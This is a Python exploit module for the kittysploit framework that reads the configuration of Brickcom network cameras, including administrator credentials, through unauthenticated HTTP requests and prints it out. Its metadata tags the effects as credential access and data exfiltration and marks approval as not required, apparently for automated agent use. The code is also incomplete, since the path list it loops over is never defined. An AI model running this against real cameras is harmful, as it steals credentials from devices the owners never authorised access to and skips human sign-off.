#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Brickcom Corp Network Camera Conf Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Brickcom Corp Network Camera Conf Disclosure',
        'description': 'Module exploits Brickcom Corporation Network Camera Configuration Dislosure vulnerability. If target is vulnerable it is possible to read device configuration including administrative credentials.',
        'author': ['Orwelllabs', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/39696/'],
        'tags': ['iot', 'camera', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Dumping configuration...")
            print_status("URL: {}".format(self.get_target_url(path=self.valid_path)))

            dump_size = 10000
            if len(self.content) > dump_size:
                print_status("Content too big to display - showing first {} characters.".format(dump_size))
                print_info(self.content[:dump_size])  # max 10000 characters
                print_info("(..)")
            else:
                print_info(self.content)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        for path in self.paths:
            response = self.http_request(
                method="GET",
                path=path,
            )

            if response is None:
                break

            if any([setting in response.text for setting in ["DeviceBasicInfo", "UserSetSetting", "DDNSSetting"]]):
                self.content = response.text
                self.valid_path = path
                return True  # target is vulnerable

        return False  # target is not vulnerable
